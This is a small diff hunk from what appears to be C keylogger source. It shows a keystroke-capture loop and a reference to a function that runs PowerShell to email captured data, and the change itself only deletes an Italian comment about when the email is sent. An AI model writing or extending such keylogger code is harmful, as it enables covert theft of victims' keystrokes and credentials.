@@ -136,7 +136,7 @@ void sendinfo(void) ///Avvia la  powershell ed esegue lo script per inviare l'em
 void keylog(void) //Key logger
 {
     char c;
-    int count = 0; //quando count arriva a zero l'email viene inoltrata
+    int count = 0;
     while (true)
     {
 
